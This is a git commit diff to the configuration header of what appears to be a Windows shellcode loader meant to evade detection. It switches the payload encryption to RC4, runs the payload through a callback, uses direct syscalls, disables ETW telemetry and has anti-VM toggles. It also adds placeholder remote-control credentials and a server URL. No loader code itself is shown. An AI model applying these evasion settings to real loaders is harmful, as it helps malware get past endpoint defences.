8f1320ae824144d28c27c8f87fe0f8a805ccfe8f
ArcueId <1340332267@qq.com>
2025-05-09 16:47:21 +0800

    update config template

--- Loader/config.h
+++ Loader/config.h
@@ -5,17 +5,25 @@
 
 //  ====================  CONFIG  ==========================
 static BOOLEAN isSyscall = TRUE;
-static EncryptMethod encryptMethod = CASE_XOR;
-static ExecutionMethod ExecMethod = AlertAPC;
-static EnumMethod enumMethod = CASE_CertEnumSystemStore;
+static EncryptMethod encryptMethod = CASE_RC4;
+static ExecutionMethod ExecMethod = EnumCallback;
+static EnumMethod enumMethod = CASE_EnumTimeFormatsEx;
 static BOOLEAN EnableAntiVM = FALSE;
 static BOOLEAN AntiDefenderVM = FALSE;
 static BOOLEAN trick_DllGetClassObject = TRUE;
 static BOOLEAN trick_SxInDll = TRUE;
-static AllocateMethod allocateMethod = CASE_NtAllocateVirtualMemory;
+static AllocateMethod allocateMethod = CASE_NtMapOfView;
 static BOOLEAN checkVXQQ = FALSE;
 static BOOLEAN EnableSteg = FALSE;
 static BOOLEAN DisableETW = TRUE;
 static BOOLEAN EnableMultiplePayloadControl = TRUE;
 static wchar_t const* stegPath = ENCRYPT_WSTR("\\1.png");
+static BOOLEAN EnableAccessControl = TRUE;
+
+// ◊º»Îøÿ÷∆≈‰÷√
+static std::string AppID = ENCRYPT_STR("xxxxxxxxxxxx");
+static std::string AppSecret = ENCRYPT_STR("xxxxxxxxxxxx");
+static std::string VpsUrl = ENCRYPT_STR("http://xxxxxxxxx/");
+static std::string SheetID = ENCRYPT_STR("xxxxxx");
+static std::string SpreadsheetToken = ENCRYPT_STR("xxxxxxxx");
 // ==================== CONFIG END ==========================
